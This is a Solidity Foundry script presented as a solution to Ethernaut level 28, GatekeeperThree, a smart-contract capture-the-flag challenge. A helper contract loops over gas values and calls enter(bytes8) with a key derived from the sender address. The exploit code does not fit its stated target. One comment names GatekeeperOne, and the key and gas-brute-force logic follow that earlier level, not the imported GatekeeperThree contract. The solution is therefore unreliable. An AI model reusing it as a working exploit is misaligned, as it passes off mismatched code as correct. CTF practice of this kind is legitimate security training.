// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {GatekeeperThree} from "../../challenge-contracts/28-GatekeeperThree.sol";

contract GatekeeperThreeSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x653239b3b3E67BC0ec1Df7835DA2d38761FfD882;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Deploy Solution contract;
        Solution solution = new Solution(challengeInstance);

        // Step 2: Call `open()` function of Solution contract,
        solution.open();

        // Step 3: Confirm that caller `heroAddress` has successfully become entrant of the GatekeeperOne contract.
        GatekeeperThree three = GatekeeperThree(payable(challengeInstance));
        address heroAddress = vm.addr(heroPrivateKey);
        require(three.entrant() == heroAddress, "Entrant check failed");

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(28));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract Solution {
    address gateAddress;

    constructor(address threeAddress) {
        gateAddress = threeAddress;
    }

    function open() external {
        // 1 byte is 8 bits and 1 hexadecimal is 4 bits, so 1 byte is 2 hexadecimal digits;
        // uint16 is 16 bits, thus 2 bytes, thus 4 hexadecimal digits;
        //
        // modifier `gateThree` requirement 3: uint32(uint64(_gateKey) == uint16(uint160(tx.origin))
        // Since calling address is `0x41F669e9c3dCDBf71d2C60843BfDC47bCE257081`, `uint16(uint160(tx.origin))` is `7081`;
        // Since `uint32(uint64(_gateKey) == uint16(uint160(tx.origin))`, thus `_gateKey` is from `0000000000007081` to `FFFFFFFF00007081`;
        //
        // modifier `gateThree` requirement 1: uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
        // Since `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`, thus `_gateKey` is from `0000000000007081` to `FFFFFFFF00007081`;
        //
        // modifier `gateThree` requirement 2: uint32(uint64(_gateKey)) != uint64(_gateKey)
        // Since `uint32(uint64(_gateKey)) != uint64(_gateKey)`, thus `_gateKey` is from `0000000100007081` to `FFFFFFFF00007081`;
        //
        // Loop function call until `gasleft()` meets requirement;
        //
        // bytes8 key = bytes8(uint64(uint16(uint160(msg.sender)))) |
        //     bytes8(0x0000000100000000);
        bytes8 key = bytes8(uint64(uint16(uint160(msg.sender))) + 2 ** 32);

        for (uint i = 0; i < 8191; i++) {
            (bool success, ) = gateAddress.call{gas: 50000 + i}(
                abi.encodeWithSignature("enter(bytes8)", bytes8(key))
            );
            if (success) {
                break;
            }
        }
    }
}
////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra Contract)
////////////////////////////////////////////////////////////////////////////////////
